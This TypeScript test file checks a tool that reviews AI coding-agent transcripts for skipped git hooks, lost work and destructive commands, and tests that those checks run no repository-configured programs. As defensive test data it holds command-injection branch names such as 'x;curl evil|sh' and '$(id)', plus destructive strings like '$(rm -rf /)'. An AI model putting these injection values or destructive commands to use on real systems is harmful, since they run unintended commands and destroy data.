// cspell:words fsmonitor gpgsig lnbm worktrees
/**
 * The git-backed checks together (`core/verify/git-checks.ts`): every `git` call they make is on
 * the allow-list and none is refused; a repository's own config starts no program; they write
 * nothing; and they never throw, whatever the transcript holds or the machine answers.
 */

import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { runScan } from "../commands/scan.js";
import { boundaryVerification, renderReport } from "../core/report.js";
import { CARD_BUILDERS } from "../core/verify/builders.js";
import { isLocalFix, unconfirmedOf } from "../core/verify/cards.js";
import { checkGitBacked, GIT_CARD_BUILDERS } from "../core/verify/git-checks.js";
import { lostWorkCard } from "../core/verify/lost-work.js";
import {
  type GitOutcome,
  VERIFY_CATEGORIES,
  type Verification,
  type VerifyIO,
} from "../core/verify/types.js";
import { createRealScanIO, type ScanIO } from "../scan-io.js";
import { createRealVerifyIO, isAllowedGitCall } from "../verify-io.js";
import {
  checkedOf,
  commitLine,
  corpusOf,
  type GitSession,
  git,
  makeRepo,
  rev,
  runChecks,
  setRemoteBranch,
  tempFolder,
  verifyIO,
} from "./git-check-fixtures.js";
import { baseResult, SECRETS_CLEAN, VERIFIED_META } from "./verified-corpus.js";
import { writeCorpus } from "./verify-fixtures.js";

/** The git-backed categories. */
type GitName = keyof typeof GIT_CARD_BUILDERS;

/** The frame's could-not-confirm line, after a call that ran eval. */
const CNC = "could-not-confirm";
const EVAL_LINE =
  "Could not confirm: commands that ran, or may have run, here used eval, which can run commands this reading does not take apart, so this is not a clean result.";

/** A repo, and a session that ran one command of every kind the checks look up. */
function everything(label: string): { root: string; sessions: GitSession[] } {
  const root = makeRepo(label, {
    files: { "src/a.ts": "a\n", "README.md": "r\n" },
    hooks: ["pre-commit"],
  });
  git(root, "switch", "-q", "-c", "topic");
  commitLine(root, "t.txt", "topic work");
  git(root, "switch", "-q", "main");
  const deleted = git(root, "branch", "-D", "topic");
  writeFileSync(join(root, "README.md"), "changed\n");
  git(root, "stash", "push", "-q");
  const dropped = git(root, "stash", "drop");
  const committed = commitLine(root, "c.txt", "skip hooks", ["--no-verify"]);
  setRemoteBranch(root, "main", rev(root, "HEAD"));
  rmSync(join(root, "src"), { recursive: true });
  const sessions: GitSession[] = [
    {
      cwd: root,
      events: [
        { kind: "bash", command: "git branch -D topic", output: deleted },
        { kind: "bash", command: "git stash drop", output: dropped },
        { kind: "bash", command: `git commit --no-verify -m "skip hooks"`, output: committed },
        { kind: "bash", command: "git config core.hooksPath /dev/null", output: "" },
        { kind: "bash", command: "rm -rf src", output: "" },
        { kind: "bash", command: "git checkout -- README.md", output: "" },
      ],
    },
  ];
  return { root, sessions };
}

/** A `VerifyIO` that records every `git` call and its outcome. */
function recording(inner: VerifyIO): {
  io: VerifyIO;
  calls: { args: readonly string[]; out: GitOutcome }[];
} {
  const calls: { args: readonly string[]; out: GitOutcome }[] = [];
  return {
    calls,
    io: {
      ...inner,
      git: async (cwd, args) => {
        const out = await inner.git(cwd, args);
        calls.push({ args, out });
        return out;
      },
    },
  };
}

describe("every git call is allow-listed", () => {
  it("none is refused, and every check found what it was given", async () => {
    const home = tempFolder("home");
    const { sessions } = everything("all-calls");
    const { io, calls } = recording(verifyIO(home));
    const outcome = await runChecks("claude", sessions, home, { io });
    expect(calls.length).toBeGreaterThan(8);
    for (const call of calls) {
      expect(isAllowedGitCall(call.args), JSON.stringify(call.args)).toBe(true);
      expect(call.out).not.toEqual({ ok: false, reason: "refused" });
    }
    expect(new Set(calls.map((c) => c.args[0]))).toEqual(
      new Set(["rev-parse", "log", "for-each-ref", "stash", "ls-files"]),
    );
    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
    expect(checkedOf(outcome["lost-work"]).facts.stashes.recoverable).toBe(1);
    expect(checkedOf(outcome["skipped-checks"]).facts.noVerify.onMain).toBe(1);
    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
    expect(outcome.localFixes.every(isLocalFix)).toBe(true);
    expect(outcome.localFixes.map((f) => f.category).sort()).toEqual([
      "destructive",
      "lost-work",
      "lost-work",
      "skipped-checks",
    ]);
  });
});

describe("a repository's own config starts no program", () => {
  it("fsmonitor, pager and external diff never run through any check", async () => {
    const home = tempFolder("home");
    const { root, sessions } = everything("hostile");
    const marker = join(tempFolder("marker"), "ran");
    const script = join(tempFolder("script"), "run.sh");
    writeFileSync(script, `#!/bin/sh\ntouch "${marker}"\n`, { mode: 0o755 });
    for (const [key, value] of [
      ["core.fsmonitor", script],
      ["core.pager", script],
      ["diff.external", script],
    ] as const) {
      git(root, "config", key, value);
    }
    const outcome = await runChecks("claude", sessions, home);
    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
    expect(existsSync(marker)).toBe(false);

    // Negative control: the same listing without the safety flags does start the monitor.
    execFileSync("git", ["ls-files", "--deleted", "-z"], { cwd: root, stdio: "pipe" });
    expect(existsSync(marker)).toBe(true);
  });
});

/** A command with every single-quoted argument taken out: what the shell reads as syntax. */
function outsideQuotes(command: string): string {
  return command.replace(/'[^']*'/g, "").replace(/\\'/g, "");
}

/** A repo with a commit no ref holds any more, and that commit's full id. */
function unreachableCommit(root: string): string {
  git(root, "switch", "-q", "-c", "topic");
  commitLine(root, "t.txt", "topic work");
  const commit = rev(root, "HEAD");
  git(root, "switch", "-q", "main");
  git(root, "branch", "-D", "topic");
  return commit;
}

describe("recovery commands: every part quoted, and a hostile one left out with a note", () => {
  it("every exact command is quoted argument by argument", async () => {
    const home = tempFolder("home");
    const { sessions } = everything("quoted");
    const outcome = await runChecks("claude", sessions, home);
    expect(outcome.localFixes.length).toBe(4);
    for (const fix of outcome.localFixes) {
      expect(outsideQuotes(fix.command).trim()).toBe("");
    }
    expect(outcome.unsafeFixes).toEqual([]);
  });

  it.each([
    "x;curl",
    "$(id)",
    "`id`",
    "a'b",
    "x|sh",
  ])("a deleted branch named %s gets no command, and is counted", async (name) => {
    const home = tempFolder("home");
    const root = makeRepo("hostile-branch");
    const commit = unreachableCommit(root);
    const outcome = await runChecks(
      "claude",
      [
        {
          cwd: root,
          events: [
            {
              kind: "bash",
              command: "git branch -D topic",
              output: `Deleted branch ${name} (was ${commit.slice(0, 7)}).\n`,
            },
          ],
        },
      ],
      home,
    );
    const lost = checkedOf(outcome["lost-work"]);
    expect(lost.facts.branches.recoverable).toBe(1);
    expect(lost.facts.unsafeFixes).toBe(1);
    expect(outcome.localFixes).toEqual([]);
    expect(outcome.unsafeFixes).toEqual([
      { category: "lost-work", unsafe: true, note: "could not make a safe command" },
    ]);
    const card = lostWorkCard(lost, { ranEvidence: "tool-result" });
    expect(card.now.map((s) => s.template)).toContain("lost-work.now.unsafe-fixes");
    expect(JSON.stringify(card)).not.toContain(name);
  });

  it("a name with a space is not read as a deleted branch at all", async () => {
    const home = tempFolder("home");
    const root = makeRepo("hostile-space");
    const commit = unreachableCommit(root);
    const outcome = await runChecks(
      "claude",
      [
        {
          cwd: root,
          events: [
            {
              kind: "bash",
              command: "git branch -D topic",
              output: `Deleted branch x;curl evil|sh (was ${commit.slice(0, 7)}).\n`,
            },
            {
              kind: "bash",
              command: "git stash drop",
              output: "Dropped refs/stash@{0} ($(id))\n",
            },
          ],
        },
      ],
      home,
    );
    const lost = checkedOf(outcome["lost-work"]);
    expect(lost.facts.branches.notIdentified).toBe(1);
    expect(lost.facts.stashes.notIdentified).toBe(1);
    expect(outcome.localFixes).toEqual([]);
    expect(outcome.unsafeFixes).toEqual([]);
  });

  it("a repo folder with a hostile name gets no command from any check", async () => {
    const home = tempFolder("home");
    const root = join(tempFolder("hostile-parent"), "repo;$(id)`x`|y");
    mkdirSync(root);
    git(root, "init", "-q", "-b", "main");
    mkdirSync(join(root, "src"));
    writeFileSync(join(root, "src", "a.ts"), "a\n");
    git(root, "add", "-A");
    git(root, "commit", "-q", "-m", "first");
    writeFileSync(join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n", {
      mode: 0o755,
    });
    const commit = unreachableCommit(root);
    const committed = commitLine(root, "c.txt", "skip", ["--no-verify"]);
    setRemoteBranch(root, "main", rev(root, "HEAD"));
    rmSync(join(root, "src"), { recursive: true });
    const outcome = await runChecks(
      "claude",
      [
        {
          cwd: root,
          events: [
            {
              kind: "bash",
              command: "git branch -D topic",
              output: `Deleted branch topic (was ${commit.slice(0, 7)}).\n`,
            },
            { kind: "bash", command: `git commit --no-verify -m "skip"`, output: committed },
            { kind: "bash", command: "rm -rf src", output: "" },
          ],
        },
      ],
      home,
    );
    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
    expect(checkedOf(outcome["skipped-checks"]).facts.noVerify.onMain).toBe(1);
    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
    expect(outcome.localFixes).toEqual([]);
    expect(outcome.unsafeFixes.map((f) => f.category).sort()).toEqual([
      "destructive",
      "lost-work",
      "skipped-checks",
    ]);
    expect(checkedOf(outcome["lost-work"]).facts.unsafeFixes).toBe(1);
    expect(checkedOf(outcome["skipped-checks"]).facts.unsafeFixes).toBe(1);
    expect(checkedOf(outcome.destructive).facts.unsafeFixes).toBe(1);
    for (const fix of outcome.unsafeFixes) {
      expect(JSON.stringify(fix)).not.toContain("$(id)");
    }
  });
});

describe("a signed commit starts no signature program", () => {
  it("through the lost-work lookups: log for a deleted branch, stash list for a dropped stash", async () => {
    const home = tempFolder("home");
    const root = makeRepo("signed");
    const marker = join(tempFolder("gpg-marker"), "ran");
    const script = join(tempFolder("gpg-script"), "gpg.sh");
    writeFileSync(script, `#!/bin/sh\ntouch "${marker}"\nexit 1\n`, { mode: 0o755 });
    // A commit object carrying a signature header (any bytes will do), built in test code,
    // made the tip of a deleted branch and the newest entry of the stash list.
    const tree = rev(root, "HEAD^{tree}");
    const signed = execFileSync("git", ["hash-object", "-t", "commit", "--stdin", "-w"], {
      cwd: root,
      input: [
        `tree ${tree}`,
        `parent ${rev(root, "HEAD")}`,
        "author A <a@example.invalid> 1700000000 +0000",
        "committer A <a@example.invalid> 1700000000 +0000",
        "gpgsig -----BEGIN PGP SIGNATURE-----",
        " ",
        " c2lnbmF0dXJl",
        " -----END PGP SIGNATURE-----",
        "",
        "signed",
        "",
      ].join("\n"),
      encoding: "utf8",
    }).trim();
    git(root, "update-ref", "--create-reflog", "-m", "stash", "refs/stash", signed);
    git(root, "config", "log.showSignature", "true");
    git(root, "config", "gpg.program", script);
    const outcome = await runChecks(
      "claude",
      [
        {
          cwd: root,
          events: [
            {
              kind: "bash",
              command: "git branch -D topic",
              output: `Deleted branch topic (was ${signed.slice(0, 7)}).\n`,
            },
            {
              kind: "bash",
              command: "git stash drop",
              output: `Dropped refs/stash@{1} (${rev(root, "HEAD")})\n`,
            },
          ],
        },
      ],
      home,
    );
    // Both lookups ran: the branch's commit was found, and the stash list was read.
    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
    expect(checkedOf(outcome["lost-work"]).facts.stashes.dropped).toBe(1);
    expect(checkedOf(outcome["lost-work"]).facts.stashes.couldNotCheck).toBe(0);
    expect(existsSync(marker)).toBe(false);

    // Negative control: the same lookup without the safety flags does run the program.
    try {
      execFileSync("git", ["log", "--no-walk", "--ignore-missing", "--format=%H", signed], {
        cwd: root,
        stdio: "pipe",
      });
    } catch {
      // A failed signature check may exit non-zero; only whether the program ran matters.
    }
    expect(existsSync(marker)).toBe(true);
  });
});

describe("the checks write nothing", () => {
  it("no file in the repo, and no index refresh", async () => {
    const home = tempFolder("home");
    const { root, sessions } = everything("no-write");
    const before = readdirSync(root).sort();
    const index = statSync(join(root, ".git", "index")).mtimeMs;
    const refs = git(root, "for-each-ref");
    await runChecks("claude", sessions, home);
    expect(readdirSync(root).sort()).toEqual(before);
    expect(statSync(join(root, ".git", "index")).mtimeMs).toBe(index);
    expect(git(root, "for-each-ref")).toBe(refs);
    expect(readdirSync(home)).toEqual([]);
  });
});

describe("never throws, never clean on a failure", () => {
  it("a seam that throws gives could-not-check for every git-backed category", async () => {
    const { root, sessions } = everything("throws");
    const broken: VerifyIO = {
      ...verifyIO(tempFolder("home")),
      git: () => Promise.reject(new Error("broken")),
    };
    const outcome = await checkGitBacked({
      corpus: corpusOf("claude", sessions),
      io: broken,
      home: tempFolder("home"),
      scratchRoots: [],
    });
    expect(outcome["skipped-checks"].status).toBe("could-not-check");
    expect(outcome["lost-work"].status).toBe("could-not-check");
    expect(outcome.destructive.status).toBe("could-not-check");
    expect(outcome.localFixes).toEqual([]);
    expect(existsSync(root)).toBe(true);
  });

  it("hostile and malformed commands are read without throwing", async () => {
    const odd = [
      "",
      "'",
      '"',
      "$(",
      "`",
      "<<",
      "<<EOF",
      ")(",
      "rm -rf",
      "rm -rf -- ",
      "git",
      "git -C",
      "git branch -D",
      "git commit -n",
      "psql -h",
      "docker exec",
      "ssh",
      "kubectl exec --",
      `git -C "$(printf x)" checkout -- "$(rm -rf /)"`,
      "a".repeat(100_000),
      `${"(".repeat(2_000)}rm -rf x${")".repeat(2_000)}`,
      `rm -rf ${"x/".repeat(5_000)}`,
      "\u0000\u0001 rm -rf ‮ x",
    ];
    for (const agent of ["claude", "codex", "cursor"] as const) {
      const outcome = await runChecks(
        agent,
        [
          {
            cwd: tempFolder("odd"),
            events: odd.map((command) => ({
              kind: "bash" as const,
              command,
              output: "Deleted branch x (was zz).",
            })),
          },
        ],
        tempFolder("home"),
      );
      expect(outcome.destructive.status).not.toBe("not-checked");
    }
  });
});

describe("a hiding form in a call that ran keeps every git-backed category from clean", () => {
  it("each category says it could not confirm, and none says nothing ran", async () => {
    const root = makeRepo("hiding-all");
    const outcome = await runChecks(
      "claude",
      [{ cwd: root, events: [{ kind: "bash", command: 'eval "$TASK"', output: "" }] }],
      tempFolder("home"),
    );
    for (const name of ["skipped-checks", "lost-work", "destructive"] as const) {
      const result = checkedOf<{ readonly hidingForms: readonly string[] }>(outcome[name] as never);
      expect(result.status, name).toBe("could-not-check");
      expect(result.facts.hidingForms, name).toEqual(["eval"]);
      const card = GIT_CARD_BUILDERS[name](result as never, { ranEvidence: "tool-result" });
      const found = card.found.map((s) => s.template);
      expect(found, name).not.toContain(`${name}.none`);
      // The frame's one could-not-confirm line says it; the card has no line of its own.
      expect(
        found.filter((t) => t.endsWith("could-not-confirm")),
        name,
      ).toEqual([]);
      expect(unconfirmedOf(name, result.status, result.facts, true)?.forms, name).toEqual(["eval"]);
    }
  });

  it.each([
    ["one that ran eval", 'eval "$TASK"', 1],
    ["none that ran a command the checks read", "ls -la", 0],
  ])("the real cards through the report's boundary, after %s", async (_name, command, hiding) => {
    const root = makeRepo("hiding-page");
    const outcome = await runChecks(
      "claude",
      [{ cwd: root, events: [{ kind: "bash", command, output: "" }] }],
      tempFolder("home"),
    );
    /** The three real git results, `drop` taken out of their facts; every other is not checked. */
    const verificationOf = (drop?: string): Verification => {
      const categories = Object.fromEntries(
        VERIFY_CATEGORIES.map((c) => {
          // The secrets check always carries its facts.
          if (c === "secrets") return [c, { status: "clean", matches: 0, facts: SECRETS_CLEAN }];
          if (!(c in GIT_CARD_BUILDERS)) return [c, { status: "not-checked" }];
          const result = checkedOf<Record<string, unknown>>(outcome[c as GitName] as never);
          const facts = { ...result.facts };
          if (drop !== undefined) delete facts[drop];
          return [c, { ...result, facts }];
        }),
      );
      return {
        matchedCalls: { ran: 1, mentioned: 0, unknown: 0 },
        resultsRecorded: true,
        ranEvidence: "tool-result",
        categories,
      } as unknown as Verification;
    };
    const page = (drop?: string): string =>
      renderReport(baseResult(verificationOf(drop)), VERIFIED_META, {
        cardBuilders: CARD_BUILDERS,
      });
    /** Each line of a card on the page, as its template and its text. */
    const linesOf = (html: string, name: GitName): string[][] => {
      const at = html.indexOf(`id="check-${name}"`);
      expect(at, name).toBeGreaterThan(-1);
      const card = html.slice(html.lastIndexOf("<article", at), html.indexOf("</article>", at));
      return [...card.matchAll(/<p data-template="([^"]+)">([^<]*)<\/p>/g)].map((m) => [
        m[1] as string,
        m[2] as string,
      ]);
    };
    const LINES: Record<GitName, readonly string[][]> =
      hiding > 0
        ? {
            "skipped-checks": [[CNC, EVAL_LINE]],
            "lost-work": [[CNC, EVAL_LINE]],
            destructive: [[CNC, EVAL_LINE]],
          }
        : {
            "skipped-checks": [
              ["skipped-checks.none", "No command this check could read skipped a hook."],
            ],
            "lost-work": [
              [
                "lost-work.none",
                "No command this check could read deleted a branch or a stash, or discarded changes.",
              ],
            ],
            destructive: [
              [
                "destructive.none",
                "No rm -rf and no database wipe that this check could read ran.",
              ],
            ],
          };
    const html = page();
    const crossed = boundaryVerification(verificationOf(), false);
    for (const name of Object.keys(LINES) as GitName[]) {
      // The count of hiding calls is a registered fact key, so it crosses the boundary.
      const result = crossed.categories[name] as { facts?: { hidingCalls?: number } };
      expect(result.facts?.hidingCalls, name).toBe(hiding);
      expect(linesOf(html, name), name).toEqual(LINES[name]);
    }
    // Negative control: a boundary that dropped the key would lose the lines that say nothing
    // ran, which ask for no hiding call at all. (After eval the hiding forms carry the card.)
    if (hiding === 0) {
      const dropped = page("hidingCalls");
      for (const name of ["lost-work", "destructive"] as const) {
        expect(linesOf(dropped, name), name).toEqual([]);
      }
    }
  });
});

describe("Codex, through its rollout reader and scan --verify", () => {
  /** `scan --verify --json` over Codex session files, with the real seam. */
  async function codexScan(dir: string) {
    const real = createRealScanIO();
    const out: string[] = [];
    const work = tempFolder("codex-work");
    const io: ScanIO = {
      ...real,
      cwd: () => work,
      writeStdout: (text) => {
        out.push(text);
      },
      writeFile: () => true,
      openInBrowser: () => true,
      env: { CI: "1" },
      isTTY: () => false,
    };
    await runScan(["--agent", "codex", "--dir", dir, "--verify", "--json"], io, {
      catalog: [],
      now: new Date("2026-10-01T00:00:00.000Z"),
      createVerifyIO: () => createRealVerifyIO(),
    });
    return JSON.parse(out.join("")).result.verification;
  }

  it("each check reads the call's workdir, not the session's folder, and says how far Codex goes", async () => {
    const repo = makeRepo("codex-workdir", {
      files: { "src/a.ts": "a\n", "README.md": "r\n" },
      hooks: ["pre-commit"],
    });
    rmSync(join(repo, "src"), { recursive: true });
    // The session starts in a folder that is no repo: only the workdir leads to the repo.
    const session = tempFolder("codex-session");
    // The agent's own worktree: a discard there throws away only the agent's work.
    const own = join(tempFolder("codex-own"), ".codex", "worktrees", "w1");
    mkdirSync(own, { recursive: true });
    const { root, corpus } = await writeCorpus(
      "codex",
      [
        [
          { kind: "prompt", text: "tidy up" },
          {
            kind: "call",
            command: `git commit --no-verify -m "wip"`,
            result: { text: "[main 1234567] wip" },
            workdir: repo,
          },
          {
            kind: "call",
            command: "git checkout -- README.md",
            result: { text: "" },
            workdir: own,
          },
          { kind: "call", command: "rm -rf src", result: { text: "" }, workdir: repo },
        ],
      ],
      { cwd: session },
    );
    const v = await codexScan(root);
    expect(v.ranEvidence).toBe("output-record");

    const skipped = v.categories["skipped-checks"];
    expect(skipped.facts.noVerify.calls.ran).toBe(1);
    // Codex keeps that a call printed something, not what: the id is not identified.
    expect(skipped.facts.noVerify.notIdentified).toBe(1);
    // The hooks are in the workdir's repo: the session's folder is in none.
    expect(skipped.facts.hooksPath.on).toBe(1);
    // Under scan, every folder in the temp folder is scratch, so the classes are read from
    // the same reader's corpus with no scratch folders.
    const home = tempFolder("codex-home");
    const outcome = await checkGitBacked({ corpus, io: verifyIO(home), home, scratchRoots: [] });
    expect(checkedOf(outcome["lost-work"]).facts.discards).toMatchObject({
      ownCopy: 1,
      mainCheckout: 0,
    });
    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);

    const context = { ranEvidence: "output-record" } as const;
    for (const name of ["skipped-checks", "lost-work", "destructive"] as const) {
      const card = GIT_CARD_BUILDERS[name](v.categories[name], context);
      const line = card.found.find((s) => s.template === `${name}.codex-limited`);
      expect(line?.text, name).toContain("limited and unverified");
      expect(line?.text, name).toContain("synthetic sessions");
      expect(line?.text, name).toContain("a hook blocked");
      expect(line?.text, name).toContain("not identified");
      expect(card.codexCaveat, name).toBe(true);
      // The same card on a Claude Code scan has no Codex line.
      const claude = GIT_CARD_BUILDERS[name](v.categories[name], { ranEvidence: "tool-result" });
      expect(
        claude.found.map((s) => s.template),
        name,
      ).not.toContain(`${name}.codex-limited`);
    }
  });
});

describe("the builders for the page's registry", () => {
  it("are exported for each git-backed category", () => {
    expect(Object.keys(GIT_CARD_BUILDERS).sort()).toEqual([
      "destructive",
      "lost-work",
      "skipped-checks",
    ]);
  });
});
